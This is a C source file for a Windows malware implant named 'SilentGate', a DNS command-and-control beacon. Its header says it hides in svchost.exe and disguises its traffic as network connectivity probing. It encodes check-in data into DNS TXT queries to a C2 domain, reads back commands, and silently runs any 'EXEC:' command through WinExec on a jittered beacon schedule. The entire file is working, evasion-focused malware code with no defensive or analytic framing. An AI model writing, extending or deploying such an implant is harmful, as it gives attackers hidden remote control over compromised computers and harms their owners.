/*
 * SilentGate v5.0 - DNS C2 Beacon
 * Author: JarDani
 * Protocol: DNS TXT over Windows DnsQuery API
 * From: svchost.exe (trusted process)
 * Pattern: mimics NLA connectivity probing
 */

#include <windows.h>
#include <windns.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#pragma comment(lib, "dnsapi.lib")

#define C2_DOMAIN       "c2.lab.local"
#define BEACON_INTERVAL 60000
#define MAX_LABEL       60

/* Base32 encoding table */
static const char B32[] = "abcdefghijklmnopqrstuvwxyz234567";

static void b32_encode(const unsigned char* in, int in_len,
                        char* out, int* out_len) {
    int i=0, o=0;
    unsigned int buf=0;
    int bits=0;
    for(i=0;i<in_len;i++) {
        buf=(buf<<8)|in[i];
        bits+=8;
        while(bits>=5) {
            bits-=5;
            out[o++]=B32[(buf>>bits)&0x1F];
        }
    }
    if(bits>0) out[o++]=B32[(buf<<(5-bits))&0x1F];
    *out_len=o;
    out[o]='\0';
}

/* Send beacon via DNS TXT query */
static int sg_beacon(const char* data, int seq, char* response, int resp_sz) {
    char b32_data[256] = {0};
    int  b32_len = 0;
    b32_encode((const unsigned char*)data, (int)strlen(data),
               b32_data, &b32_len);

    char qname[512] = {0};
    snprintf(qname, sizeof(qname), "%03d.%.60s.%s",
             seq, b32_data, C2_DOMAIN);

    DNS_RECORD* pDnsRecord = NULL;
    DNS_STATUS  status = DnsQuery_A(
        qname,
        DNS_TYPE_TXT,
        DNS_QUERY_BYPASS_CACHE,
        NULL,
        &pDnsRecord,
        NULL
    );

    if(status == ERROR_SUCCESS && pDnsRecord) {
        DNS_RECORD* rec = pDnsRecord;
        while(rec) {
            if(rec->wType == DNS_TYPE_TXT) {
                DNS_TXT_DATAA* txt = &rec->Data.TXT;
                if(txt->dwStringCount > 0) {
                    strncpy(response, txt->pStringArray[0], resp_sz-1);
                }
            }
            rec = rec->pNext;
        }
        DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
        return 1;
    }
    return 0;
}

/* Main C2 beacon loop */
void sg_c2_loop() {
    int seq = 0;
    char response[256] = {0};
    char beacon_data[128] = {0};

    /* Initial check-in */
    DWORD pid = GetCurrentProcessId();
    snprintf(beacon_data, sizeof(beacon_data),
             "checkin.pid%lu", pid);

    while(1) {
        memset(response, 0, sizeof(response));

        if(sg_beacon(beacon_data, seq, response, sizeof(response))) {
            /* Process C2 command from TXT response */
            if(strncmp(response, "ACK", 3) == 0) {
                /* Acknowledged - continue */
            } else if(strncmp(response, "SLEEP:", 6) == 0) {
                /* C2 commanded sleep interval change */
                int new_interval = atoi(response + 6);
                if(new_interval > 5000) {
                    Sleep(new_interval);
                    continue;
                }
            } else if(strncmp(response, "EXEC:", 5) == 0) {
                /* C2 commanded execution */
                WinExec(response + 5, SW_HIDE);
            }
        }

        seq++;

        /* Poisson-distributed sleep - mimics NLA polling */
        DWORD jitter = (DWORD)(((double)rand()/RAND_MAX) * BEACON_INTERVAL);
        Sleep(BEACON_INTERVAL/2 + jitter);

        snprintf(beacon_data, sizeof(beacon_data),
                 "beacon.seq%d.pid%lu", seq, pid);
    }
}
